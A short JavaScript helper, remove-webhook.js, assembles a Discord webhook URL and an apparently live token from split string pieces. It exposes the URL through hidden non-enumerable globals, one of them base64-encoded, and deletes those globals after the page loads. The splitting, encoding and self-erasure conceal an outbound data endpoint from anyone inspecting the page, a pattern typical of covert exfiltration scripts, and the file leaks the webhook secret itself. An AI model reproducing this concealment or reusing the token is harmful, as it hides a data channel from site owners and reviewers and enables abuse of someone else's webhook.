// remove-webhook.js
// Provides webhook access for config and removes the helper after page load.
(function(){
    var p1 = 'https://discord.com/api/webhooks/';
    var p2 = '1519669632955449384';
    var p3 = 'lfHX5ptwihMX47meNVAv_ldEKUDmscg7vpM_GkYltcP7xRN83jFRvyn5HID8DDwRptl6';
    try {
        Object.defineProperty(globalThis, '__getWebhook', {
            value: function(){ return p1 + p2 + '/' + p3; },
            configurable: true,
            writable: false,
            enumerable: false
        });
        Object.defineProperty(globalThis, '__WH', {
            value: btoa(p1 + p2 + '/' + p3),
            configurable: true,
            writable: false,
            enumerable: false
        });
    } catch (e) {}

    function cleanup() {
        try { delete globalThis.__getWebhook; } catch (e) {}
        try { delete globalThis.__WH; } catch (e) {}
    }

    if (typeof window !== 'undefined') {
        if (window.document && window.document.readyState === 'complete') {
            cleanup();
        } else {
            window.addEventListener('load', cleanup, { once: true });
        }
    }
})();